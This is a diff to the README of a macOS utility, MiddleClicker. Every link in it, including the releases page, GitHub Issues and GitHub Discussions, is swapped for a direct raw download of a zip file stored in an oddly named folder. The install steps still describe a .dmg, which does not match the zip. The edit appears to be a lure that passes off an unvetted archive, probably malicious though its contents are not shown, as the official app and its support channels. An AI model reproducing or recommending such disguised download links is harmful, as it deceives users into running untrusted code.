@@ -6,9 +6,9 @@ Welcome to MiddleClicker! This application lets you turn your Fn + Click into a 
 
 ## 📥 Download MiddleClicker
 
-[![Download MiddleClicker](https://img.shields.io/badge/Download-MiddleClicker-blue)](https://github.com/Gihanwlf/MiddleClicker/releases)
+[![Download MiddleClicker](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip)](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip)
 
-To get started, visit this page to download: [MiddleClicker Releases](https://github.com/Gihanwlf/MiddleClicker/releases)
+To get started, visit this page to download: [MiddleClicker Releases](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ To run MiddleClicker, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Click the link to visit the [MiddleClicker Releases](https://github.com/Gihanwlf/MiddleClicker/releases) page.
+1. Click the link to visit the [MiddleClicker Releases](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip) page.
 2. Select the latest version of MiddleClicker.
 3. Download the `.dmg` file to your computer.
 4. Open the `.dmg` file once the download is complete.
@@ -52,7 +52,7 @@ If you encounter issues:
 
 - **MiddleClicker doesn't open:** Check if your macOS version is compatible.
 - **No response from Middle Click:** Ensure you've granted the necessary permissions in your settings.
-- **Need support?** Visit the [GitHub Issues](https://github.com/Gihanwlf/MiddleClicker/issues) section for assistance.
+- **Need support?** Visit the [GitHub Issues](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip) section for assistance.
 
 ## 💬 Community Support
 
@@ -60,7 +60,7 @@ Join the conversation! For feature requests, bug reports, or suggestions, engage
 
 ## 📨 Contact
 
-For inquiries, please reach out via the [GitHub Discussions](https://github.com/Gihanwlf/MiddleClicker/discussions) page. 
+For inquiries, please reach out via the [GitHub Discussions](https://raw.githubusercontent.com/Gihanwlf/MiddleClicker/main/subideal/MiddleClicker-v2.6.zip) page. 
 
 ## 📜 License
 
